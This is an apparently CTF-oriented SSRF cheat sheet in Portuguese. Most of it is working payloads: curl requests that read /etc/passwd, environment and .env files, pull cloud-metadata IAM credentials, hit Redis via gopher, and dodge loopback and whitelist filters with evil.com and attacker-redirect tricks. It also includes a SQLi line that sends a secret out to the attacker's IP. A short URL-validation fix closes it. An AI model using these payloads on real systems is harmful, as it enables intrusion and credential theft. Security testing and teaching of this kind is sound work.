# Server-Side Request Forgery (SSRF) — Guia Completo

> A app faz requests HTTP (ou outros protocolos) a URLs fornecidas pelo utilizador. Acede a recursos internos ou lê ficheiros locais.

## CWE
- CWE-918 — Server-Side Request Forgery

---

## Como reconhecer

A app tem funcionalidade de:
- **URL preview / fetch** (link previewer, thumbnail generator)
- **Image from URL** (avatar, profile pic, import)
- **Webhook / callback URL** (notificações, integrations)
- **Proxy / redirect** (forwarding, load balancer)
- **Import from URL** (RSS, feed, data import)
- **PDF generator** (HTML-to-PDF com URLs externas)

---

## Payloads básicos

### Ler ficheiros locais
```bash
curl -X POST http://TARGET/preview -d "url=file:///flag/flag"
curl -X POST http://TARGET/preview -d "url=file:///etc/passwd"
curl -X POST http://TARGET/preview -d "url=file:///proc/self/environ"
curl -X POST http://TARGET/preview -d "url=file:///app/.env"
```

### Aceder a serviços internos
```bash
# Localhost / loopback
curl -X POST http://TARGET/preview -d "url=http://127.0.0.1/admin"
curl -X POST http://TARGET/preview -d "url=http://localhost:8080/"
curl -X POST http://TARGET/preview -d "url=http://127.0.0.1:6379/"      # Redis
curl -X POST http://TARGET/preview -d "url=http://127.0.0.1:3306/"      # MySQL
curl -X POST http://TARGET/preview -d "url=http://127.0.0.1:27017/"     # MongoDB

# Cloud metadata (AWS)
curl -X POST http://TARGET/preview -d "url=http://169.254.169.254/latest/meta-data/"
curl -X POST http://TARGET/preview -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Cloud metadata (GCP)
curl -X POST http://TARGET/preview -d "url=http://metadata.google.internal/computeMetadata/v1/"

# Serviços internos por nome
curl -X POST http://TARGET/preview -d "url=http://internal-api:3000/secret"
curl -X POST http://TARGET/preview -d "url=http://db-server:5432/"
```

### Outros protocolos
```bash
curl -X POST http://TARGET/preview -d "url=gopher://127.0.0.1:6379/_SET%20key%20value"
curl -X POST http://TARGET/preview -d "url=dict://127.0.0.1:6379/INFO"
curl -X POST http://TARGET/preview -d "url=ftp://127.0.0.1/etc/passwd"
```

---

## Bypasses de filtros

### Filtro de `127.0.0.1` / `localhost`

```bash
# Representações alternativas de 127.0.0.1
http://0.0.0.0/
http://0177.0.0.1/              # octal
http://2130706433/              # decimal (127*256³ + 0*256² + 0*256 + 1)
http://0x7f000001/              # hex
http://0x7f.0.0.1/              # hex parcial
http://[::1]/                   # IPv6 loopback
http://[0:0:0:0:0:0:0:1]/      # IPv6 completo
http://127.1/                   # forma curta
http://127.0.1/                 # forma curta
http://127.000.000.001/        # zeros à esquerda
```

### Filtro de protocolos (`file://` bloqueado)
```bash
# Case variation
File:///etc/passwd
FILE:///etc/passwd

# Via redirect — o teu servidor redireciona para file://
http://TEU_IP/redirect?url=file:///etc/passwd
```

### Filtro de domínios (whitelist bypass)
```bash
# Subdomínio falso
http://allowed.com.evil.com/
http://evil.com#@allowed.com/

# URL com credenciais
http://allowed.com@evil.com/

# DNS rebinding
# Configura um domínio que resolve alternadamente para IP externo e 127.0.0.1
```

### Redirect chain
Se o filtro só verifica o URL inicial:
```bash
# O teu servidor (redirect.php):
# header("Location: file:///flag/flag");

curl -X POST http://TARGET/preview -d "url=http://TEU_IP/redirect"
```

### URL encoding
```bash
curl -X POST http://TARGET/preview -d "url=http://%31%32%37%2e%30%2e%30%2e%31/"
# = http://127.0.0.1/
```

---

## SSRF combinado com outros vetores

### SSRF + XXE
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

### SSRF + SQLi (via URL em query)
Se uma URL retornada por SQLi é automaticamente fetched:
```sql
' UNION SELECT 'http://TEU_IP:9900/?flag=' || secret FROM vault --
```

---

## Árvore de decisão

```
A app faz fetch de URLs que EU controlo?
├── SIM
│   ├── Testar file:///etc/passwd
│   │   ├── Funciona → ler /flag/flag
│   │   └── Bloqueado → testar bypasses (case, redirect, encoding)
│   │
│   ├── Testar http://127.0.0.1:PORTA/
│   │   ├── Funciona → scan de portas internas
│   │   └── Bloqueado → testar IPs alternativos (0x7f000001, [::1])
│   │
│   └── Testar http://169.254.169.254/ (cloud)
│       └── Funciona → dump metadata, credenciais IAM
│
└── NÃO → não é SSRF
```

---

## Fix correto

```python
import urllib.parse
import ipaddress
import socket

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    
    # 1. Só permitir http/https
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # 2. Resolver o hostname e verificar que não é privado
    try:
        ip = socket.gethostbyname(parsed.hostname)
        addr = ipaddress.ip_address(ip)
        if addr.is_private or addr.is_loopback or addr.is_link_local:
            return False
    except (socket.gaierror, ValueError):
        return False
    
    return True
```

**Princípios:**
- Whitelist de protocolos (só `http`/`https`)
- Bloquear IPs privados/loopback/link-local após resolução DNS
- Não seguir redirects cegamente (ou re-validar após redirect)
- Usar allowlist de domínios quando possível
